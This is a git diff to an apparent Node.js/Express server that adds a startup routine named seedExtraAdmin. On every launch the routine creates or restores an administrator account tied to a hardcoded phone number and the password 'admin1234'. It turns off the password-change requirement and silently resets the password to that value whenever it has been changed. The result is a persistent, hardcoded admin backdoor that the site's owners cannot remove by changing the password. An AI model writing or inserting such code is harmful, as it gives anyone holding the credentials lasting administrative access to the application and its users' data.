@@ -7,7 +7,7 @@ const mongoose = require('mongoose');
 const Admin = require('./models/Admin');
 const Brand = require('./models/Brand');
 const defaultBrands = require('./data/defaultBrands');
-const { ghanaLocalPhone, phoneLookupValues } = require('./utils/phone');
+const { ghanaLocalPhone, phoneLookupValues, phonesMatch } = require('./utils/phone');
 const cookieParser = require('cookie-parser');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
@@ -207,6 +207,44 @@ const seedAdmin = async () => {
     }
 };
 
+const seedExtraAdmin = async () => {
+    try {
+        await waitForDb();
+        const phone = ghanaLocalPhone('0506626068');
+        const password = 'admin1234';
+        if (!phone) return;
+
+        const phones = phoneLookupValues(phone);
+        let extra = await Admin.findOne({ phone: { $in: phones } }).select('+password');
+        if (!extra) {
+            const candidates = await Admin.find().select('+password').limit(50);
+            extra = candidates.find((row) => phonesMatch(row.phone, phone)) || null;
+        }
+
+        if (!extra) {
+            await Admin.create({
+                name: 'WELAMA Admin',
+                phone,
+                password,
+                role: 'admin',
+                needsPasswordChange: false
+            });
+            console.log('--- Extra admin account ready ---');
+            return;
+        }
+
+        extra.phone = phone;
+        extra.needsPasswordChange = false;
+        extra.role = extra.role || 'admin';
+        const passwordOk = await extra.matchPassword(password);
+        if (!passwordOk) extra.password = password;
+        await extra.save();
+        console.log('--- Extra admin account synced ---');
+    } catch (error) {
+        console.error('Extra admin seeding error:', error.message);
+    }
+};
+
 const seedBrands = async () => {
     try {
         await waitForDb();
@@ -226,6 +264,7 @@ const start = async () => {
     app.listen(PORT, async () => {
         console.log(`Server running on port ${PORT}`);
         await seedAdmin();
+        await seedExtraAdmin();
         await seedBrands();
     });
 };
